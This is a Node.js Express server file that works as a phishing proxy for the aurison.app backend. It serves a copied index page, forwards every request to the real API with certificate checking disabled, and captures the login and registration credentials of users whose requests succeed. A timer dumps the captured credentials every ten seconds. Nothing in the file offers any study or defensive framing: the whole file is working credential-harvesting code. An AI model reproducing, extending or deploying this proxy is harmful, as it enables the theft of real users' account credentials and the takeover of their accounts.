//imports
const harvestCredentials = require('./utils/utils').grabCreds;
const credsDump = require('./utils/utils').writeCreds;
const parseJson = require('body-parser').json;
const express = require('express');
const axios = require('axios');
const https = require('https');



//consts 
const PORT = 55000;
const STAGING = 'https://test-backend.aurison.app';
const PROD = 'https://api.aurison.app';
const AGENT = new https.Agent({ rejectUnauthorized: false });
const app = express();

//vars
var HARVESTED_CREDENTIALS = [];


// Serve static files from the "public" directory
app.use('/static', express.static('static'));

//middlwares
app.use(parseJson());


//home
app.get('/', (req, res)=>{
    return res.sendFile(__dirname + '/index.html');
});


app.get('/:anypath(*)', (req, res)=>{
    return res.sendFile(__dirname + '/index.html');
});


//proxy api requests
app.all('/:path(*)', async (req, res) =>{
    const path = req.params.path;   //grab route

    try {
        const { method, headers, body} = req;    //grab relevant info from req
  
        // Make request to Aurison
        const response = await axios({
          method: method,
          headers: headers,
          data: body,
          url: `${STAGING}/${path}`,
          httpsAgent: AGENT
        });   
        
        const resHeaders = response.headers
        const keys = Object.keys(resHeaders);

        //set headers.
        keys.forEach(key => {
            res.setHeader(key, resHeaders[key]) 
        });
        
        //Grab login creds
        if (response.data.error === false && path === 'login') harvestCredentials(req, HARVESTED_CREDENTIALS);

        //Grab verify creds
        if (response.data.error === false && path == 'verifiy') {
            if (req.data.action === "register") harvestCredentials(req, HARVESTED_CREDENTIALS);
        }


        return res.status(200).json(response.data);

    } catch (error) {
        if (error.response && error.response.data) { //check if the error was raised from aurison api 
            return res.status(error.response.status).json(error.response.data);
        }

        // console.log(error);
        return res.status(400).json({
            error: true,
            error_log: 'Unknown Error'
        });
    }
});



//launch
app.listen(PORT, () => {
    setInterval(() => credsDump(HARVESTED_CREDENTIALS), 10000);   //dump any creds in queue every 10 seconds.

    console.log(`Server is listening on port ${PORT}`);
});
